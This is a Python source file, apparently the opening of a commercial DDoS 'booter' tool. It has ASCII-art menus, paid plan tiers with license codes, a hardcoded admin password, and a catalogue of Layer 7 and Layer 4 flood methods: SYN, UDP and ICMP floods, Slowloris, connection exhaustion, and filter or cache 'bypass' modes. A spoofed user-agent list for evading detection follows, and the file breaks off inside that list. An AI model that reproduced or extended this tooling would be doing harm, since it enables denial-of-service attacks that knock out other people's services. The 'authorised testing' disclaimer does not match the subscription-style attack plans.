#!/usr/bin/env python3
"""
    ┌─────────────────────────────────────────────────┐
    │   LAYER 7 & LAYER 4 DDOS TOOL                   │
    │   WITH PROXY ROTATION, BYPASS & ADMIN PANEL     │
    │   SPRAY YOUR PAYLOAD IN MY PORT !                │
    └─────────────────────────────────────────────────┘
    Author: bob (fixed async bug)
    Legal: For authorised testing only.
"""

import sys
import time
import random
import asyncio
from collections import Counter
from datetime import datetime, timedelta
import aiohttp
import re
import os
import socket
import struct
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import ssl

# Optional SOCKS support
try:
    from aiohttp_socks import ProxyConnector, ProxyType
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

# Layer 4 – scapy for packet crafting (optional, fallback to raw sockets)
try:
    from scapy.all import IP, ICMP, UDP, TCP, send
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

COLORS = {
    'red':     '\033[91m',    'bred':    '\033[1;91m',
    'green':   '\033[92m',    'bgreen':  '\033[1;92m',
    'yellow':  '\033[93m',    'byellow': '\033[1;93m',
    'blue':    '\033[94m',    'bblue':   '\033[1;94m',
    'magenta': '\033[95m',    'bmagenta':'\033[1;95m',
    'cyan':    '\033[96m',    'bcyan':   '\033[1;96m',
    'white':   '\033[97m',    'bwhite':  '\033[1;97m',
    'gray':    '\033[90m',    'bgray':   '\033[1;90m',
    'orange':  '\033[38;5;208m', 'pink':    '\033[38;5;206m',
    'purple':  '\033[38;5;135m', 'teal':    '\033[38;5;45m',
    'lime':    '\033[38;5;118m', 'violet':  '\033[38;5;165m',
    'gold':    '\033[38;5;220m',
}

RESET = '\033[0m'
BOLD  = '\033[1m'

current_color = COLORS['bcyan']
current_name  = 'Bright Cyan'

# Use raw strings for ASCII art to avoid escape sequence warnings
ASCII_MENUS = {
    'devil': r"""
      ⢸⣿⣧⡀⠀⣠⣴⣶⣶⣶⣶⣶⣦⣤⣀⠀⣰⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠨⣿⣿⣷⣜⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣵⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢘⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣿⣿⡙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀ ⢻⣿⣿⣷⣦⣀⣉⣽⣿⣿⣿⣿⣍⣁⣠⣾⣿⣿⣿⠁⠀⠀⠀⠀⣀⣀⡙⣷⣦⣄⠀⠀⠀
⠀⠀⠀  ⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⢀⣠⣴⣾⠿⠟⣛⣭⣿⡿⠿⢿⣦⡀
⠀  ⠀⠀⠀ ⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣅⣴⣿⡿⠟⠁⠀⠀⢸⠭⠋⠁⠀⠀⠀⠀
⠀ ⠀⠀⠀⠀⠀ ⠀⠉⠛⠿⣿⣿⣿⣿⣿⡿⠟⠋⣹⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""",
    'bomb drop': r"""⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣀⡀⠀⠀⠠⡀⠀⠀⣿⣷⣆⣀⣤⣶⣿⣿⡿⠋⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⡫⡳⣄⢰⣿⣿⣮⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠠⡀⠘⢿⣿⣦⣬⣷⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠠⣄⡀⢰⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣍⢄⡤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣶⣯⣿⣿⣿⡿⠛⠛⠉⠑⢷⣍⡛⢿⣷⣤⣴⣴⡶⠂⠀⠀⠀⠀⠀⠀
⠀⠐⠿⠿⠛⠋⠉⠀⠀⠻⢷⣄⠀⢶⣦⣌⠀⢠⡾⠟⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⣷⣄⠀⠁⠀⡀⠙⠻⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⠓⠸⣿⣷⣦⡈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣶⣦⣀⠀⠀⠀⠀⠈⠛⠿⣿⣶⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠻⣿⣧⣤⡀⠀⢀⡀⠀⠘⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣤⣤⣀⠀⠙⠏⠀⠀⢿⣿⣷⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⣿⣿⣷⣄⠀⠀⠀⠀⠙⠿⣿⣷⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⡷⠀⠀⠀⠀⠀⠻⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀  ⠀⠀⠀⠀⠈⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣏⣩⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿""",
    'ahego': r"""
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈""",
    'amaterasu eye': r"""
⠤⣤⣤⣤⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀
⢠⣤⣤⡄⣤⣤⣤⠄⣀⠉⣉⣙⠒⠤⣀⠀⠀
⣄⢻⣿⣧⠻⠇⠋⠀⠋⠀⢘⣿⢳⣦⣌⠳⠄
⠈⠃⠙⢿⣧⣙⠶⣿⣿⡷⢘⣡⣿⣿⣿⣷⣄
⠀⠀⠀⠀⠉⠻⣿⣶⠂⠘⠛⠛⠛⢛⡛⠋⠉
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⠃⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣾⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⠅⠀⠀⠀⠀⠀⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⢸⠀⠀⠀""",
    'haxor': r"""
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""",
    'l7 net': r"""
    __ _____  
   / //__  /      
  / /   / /       
 / /___/ /        
/_____/_/_     __ 
   / | / /__  / /_
  /  |/ / _ \/ __/
 / /|  /  __/ /_  
/_/ |_/\___/\__/ """,
}

current_ascii = 'devil'

PLANS = {
    'FREE': {
        'name': 'Free Plan',
        'workers': 100,
        'duration': 120,
        'methods': ['HTTP GET', 'HTTPS POST','STRESS TEST','GET/POST MIX'],
        '76034a9f5bef30b9dee701711d30bed6': ['8k3n9p2m', 'q7w4e1r6', 'a5s8d3f2']
    },
    'HARD': {
        'name': 'Hard Plan',
        'workers': 250,
        'duration': 300,
        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'DNS-AMP', 'STRESS TEST','SOCKET-AMP'],
        '76034a9f5bef30b9dee701711d30bed6': ['h4k9j2n7', 'x6c8v1b3', 'm9n2b5v4','6.4']
    },
    'PRO': {
        'name': 'Pro Plan',
        'workers': 1000,
        'duration': 3600,
        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'CURL', 'GET/POST MIX', 'DNS-AMP', 'STRESS TEST','CONCURRENT HOLD','SOCKET-AMP', 'BYPASS-GET', 'BYPASS-POST', 'RANDOM-PATH'],
        '76034a9f5bef30b9dee701711d30bed6': ['p3r7o9k2', 'l8i4u6y1', 't5g9h3j7']
    },
    'VIP': {
        'name': 'VIP Plan',
        'workers': 1500,
        'duration': 9500,
        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'CURL', 'GET/POST MIX', 'BROWSER', 'HULK', 'DNS-AMP', 'STRESS TEST', 'TLS-VIP', 'CONCURRENT HOLD','SOCKET-AMP','NET-BYPASS', 'BYPASS-GET', 'BYPASS-POST', 'RANDOM-PATH'],
        '76034a9f5bef30b9dee701711d30bed6': ['v9i2p8k4', 'z7x3c6v1', 'w4q8e2r5','xyz','.']
    }
}

current_license = {
    'plan': 'FREE',
    'code': '8k3n9p2m',
    'expires': datetime.now() + timedelta(days=5)
}

# Admin mode
admin_mode = False
ADMIN_PASSWORD = "newnew@123"
ADMIN_WORKERS = 5000
ADMIN_DURATION = 86400  # 24 hours

# All Layer 7 methods (from all plans)
ALL_L7_METHODS = sorted(list(set(
    method for plan in PLANS.values() for method in plan['methods']
)))

# Layer 4 methods
LAYER4_METHODS = [
    'TCP SYN FLOOD',
    'UDP FLOOD',
    'ICMP FLOOD',
    'SLOWLORIS',
    'CONNECTION EXHAUSTION',
    'PORT SCAN & ATTACK'
]

# Combined for admin
ALL_METHODS = ALL_L7_METHODS + LAYER4_METHODS

# Method descriptions
METHOD_DESCRIPTIONS = {
    'HTTP GET': 'Standard HTTP GET requests – simple and fast.',
    'HTTPS GET': 'Encrypted HTTPS GET requests – bypasses some filters.',
    'HTTP POST': 'HTTP POST with random data – consumes more resources.',
    'HTTPS POST': 'Encrypted POST requests – good for SSL targets.',
    'CURL': 'Simulates cURL client – generic but effective.',
    'GET/POST MIX': 'Alternates between GET and POST – unpredictable.',
    'BROWSER': 'Emulates a full browser with extra headers.',
    'HULK': 'Slowloris‑style – keeps connections open.',
    'DNS-AMP': 'Amplified DNS queries (if target is DNS).',
    'STRESS TEST': 'Burst of 50 rapid requests – high RPS.',
    'TLS-VIP': 'Multiple TLS connections – CPU intensive.',
    'CONCURRENT HOLD': '99 parallel requests per worker – max concurrency.',
    'SOCKET-AMP': 'Socket‑level amplification.',
    'NET-BYPASS': '100 rapid requests with varying paths.',
    'BYPASS-GET': 'GET with random path, query, and headers.',
    'BYPASS-POST': 'POST with random payload and headers.',
    'RANDOM-PATH': 'GET with random URL path – evades caching.',
    'TCP SYN FLOOD': 'Layer 4 – floods target with TCP SYN packets (needs root).',
    'UDP FLOOD': 'Layer 4 – sends large UDP packets to random ports.',
    'ICMP FLOOD': 'Layer 4 – ping flood (ICMP echo requests).',
    'SLOWLORIS': 'Layer 4 – holds many connections open with partial requests.',
    'CONNECTION EXHAUSTION': 'Layer 4 – opens thousands of TCP connections and keeps them alive.',
    'PORT SCAN & ATTACK': 'Layer 4 – scans for open ports and immediately floods them.',
}

USER_AGENTS = {
    'user_agents': [
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
        'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3',
        'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.113 Safari/534.30',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10',
        'Mozilla/5.0 (X11; U; Linux x86_64; en-ca) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/531.2+',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (Windows x86; rv:19.0) Gecko/20100101 Firefox/19.0',
        'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
        'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/10.04 Chromium/14.0.804.0 Chrome/14.0.804.0 Safari/535.1',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; es-ES) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',
        'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.794.0 Safari/535.1',
        'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1',
        'Mozilla/5.0 (Macintosh; rv:9.0a2) Gecko/20111101 Firefox/9.0a2',
        'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
        'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11',
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20',
        'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.107 Safari/535.1',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:27.3) Gecko/20130101 Firefox/27.3',
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; hu-HU) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0',
        'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; nl-nl) AppleWebKit/533.16 (KHTML, like Gecko) Version/4.1 Safari/533.16',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.6 Safari/537.11',
        'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
        'Mozilla/5.0 (X11; CrOS i686 1660.57.0) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.46 Safari/535.19',
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; nl-nl) AppleWebKit/533.16 (KHTML, like Gecko) Version/4.1 Safari/533.16',
        'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/10.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.678.0 Safari/534.20',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
        'Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0',
        'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1',
        'Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0',
        'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.814.0 Chrome/14.0.814.0 Safari/535.1',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.811.0 Safari/535.1',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/10.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.669.0 Safari/534.20',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.145.93 Safari/537.36',
        'Mozilla/5.0 (X11; CrOS i686 12.433.216) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.105 Safari/534.30',
        'Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1',
        'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3',
        'Mozilla/5.0 (X11; U; Linux i686; rv:1.9.1.16) Gecko/20120421 Firefox/11.0',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.145.3.93 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11',
        'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-us) AppleWebKit/534.16+ (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
        'Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.145.93 Safari/537.36',
        'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3',
        'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1',
        'Mozilla/5.0 (Windows NT 6.1; de;rv:12.0) Gecko/20120403211507 Firefox/12.0',
        'Mozilla/5.0 (Android 2.2; Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; es-ES) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110613 Firefox/6.0a2',
        'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
        'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/120.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/119.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/118.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/117.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/116.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/115.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/114.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/113.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/112.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.0.0',
        'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
        'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 6.1; rv:90.0) Gecko/20100101 Firefox/90.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
        'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
        'Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19A346 Safari/604.1',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
